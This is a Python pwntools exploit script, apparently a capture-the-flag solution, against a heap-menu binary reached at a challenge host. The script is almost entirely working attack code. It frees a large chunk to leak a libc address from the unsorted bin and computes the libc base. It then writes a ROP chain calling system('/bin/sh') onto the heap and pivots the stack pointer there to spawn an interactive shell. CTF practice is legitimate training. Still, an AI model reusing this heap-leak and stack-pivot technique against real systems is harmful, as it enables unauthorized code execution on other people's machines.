#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './ladybug_app_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = '0.cloud.chals.io', 22897

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set resolve-heap-via-heuristic force
    # set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=False)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/dreamdiary2"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================
def convert_payload(data):
    convertpayload = ""
    for i in range(len(data)// 8, -1, -1):
        convertpayload += hex(u64(data[i * 8:(i + 1) * 8].ljust(8, b'\x00')))[2:].rjust(16, '0')
    return convertpayload

def reverse_data(data):
    return ''.join(reversed([data[i:i+2] for i in range(0, len(data), 2)]))

def alloc(idx, size):
    io.sendlineafter(b'Noopsy Land is ours! Your command, Overlord?: ', 'unleash_swarm {} {}'.format(idx, size).encode())

def edit(idx, data):
    io.sendlineafter(b'Noopsy Land is ours! Your command, Overlord?: ', 'corrupt_systems {} {}'.format(idx, reverse_data(data)).encode())

def show(idx):
    io.sendlineafter(b'Noopsy Land is ours! Your command, Overlord?: ', 'gather_intel {}'.format(idx).encode())
    io.recvuntil(b"INTEL_DATA: ")
    return reverse_data(io.recvline().strip().decode())

def free(idx):
    io.sendlineafter(b'Noopsy Land is ours! Your command, Overlord?: ', 'retreat_agent {}'.format(idx).encode())

def change_rsp(rsp):
    io.sendlineafter(b'Noopsy Land is ours! Your command, Overlord?: ', 'initiate_city_takeover {}'.format(rsp).encode())

def exploit():
    global io
    io = initialize()
    with log.progress("Leak heap & libc"), context.silent:
        alloc(0, 0x428) #idx 0
        alloc(1, 0x28) #idx 1
        io.recvuntil(b'AGENT_DEPLOYED: ')
        heap_idx_1 = int(io.recvline().strip(),16)
        free(0) # free idx 0
        libc_leak = int(show(0)[:0x10], 16) # leak idx 0 unsorted bins
        libc.address = libc_leak - 0x1d2cc0 # - (main_arena + 96)
    log.info("Heap idx 1: %#x", heap_idx_1)
    log.info("Libc leak: %#x", libc_leak)
    log.info("Libc base: %#x", libc.address)
    with log.progress("Ret2system by changing rsp to heap"), context.silent:
        rop = ROP(libc)
        rop.system(next(libc.search(b'/bin/sh\x00')))
        payload = rop.chain()
        edit(1, convert_payload(payload)) # Write to heap idx 1
        change_rsp(hex(heap_idx_1)[2:]) # Change rsp to heap idx 1
    io.interactive()



if __name__ == '__main__':
    exploit()

